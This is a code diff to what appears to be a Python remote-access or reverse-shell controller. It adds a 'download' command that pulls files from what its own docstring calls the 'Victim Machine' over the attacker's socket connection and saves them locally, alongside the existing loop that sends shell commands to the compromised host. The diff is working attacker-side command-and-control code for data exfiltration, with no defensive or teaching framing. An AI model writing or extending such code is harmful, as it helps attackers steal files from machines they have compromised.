@@ -239,9 +239,6 @@ class Commands():
                 print(f"{Fore.BLUE}{key}:{Style.RESET_ALL} {val}")
     
     class Shell():
-        def __init__(self) -> None:
-            pass
-
         def run(self, command: str) -> str:
             """
             Returns the command, used for organization
@@ -253,6 +250,37 @@ class Commands():
                 str: The command
             """
             return command
+
+        def download(self, filename: str, conn: socket.socket) -> None:
+            """
+            Function to Download File from Victim Machine
+
+            Args:
+                filename (str): The Filename to save the file as
+                conn (socket.socket): The Connection to allow the reciever to connect to
+            """
+            # Add the Directory
+            dirname = os.path.dirname(__file__)
+            dirname = os.path.join(dirname, 'Downloads')
+            os.makedirs(dirname, exist_ok = True)
+
+            # Save the File
+            with open(os.path.join(dirname, filename[9:]), 'wb') as file:
+                # Get File Data
+                data = conn.recv(20480)
+                conn.settimeout(1)
+
+                # Write the Data to the File
+                while data:
+                    file.write(data)
+                    try:
+                        data = conn.recv(20480)
+                    except socket.timeout:
+                        break
+
+                # Reset the File
+                conn.settimeout(None)
+                file.close()
 
 
 class CommandCenter(Commands):
@@ -300,7 +328,10 @@ class CommandCenter(Commands):
                             if command == 'exit':
                                 self.conn.send(str.encode(command))
                                 break
-                            if command != "":
+                            elif command[:9] == 'download ':
+                                self.conn.send(str.encode(command))
+                                self.Shell().download(command, self.conn)
+                            elif command != "":
                                 data = self.Shell().run(command)
                                 self.conn.send(str.encode(data))
                                 print(self.conn.recv(20480).decode())
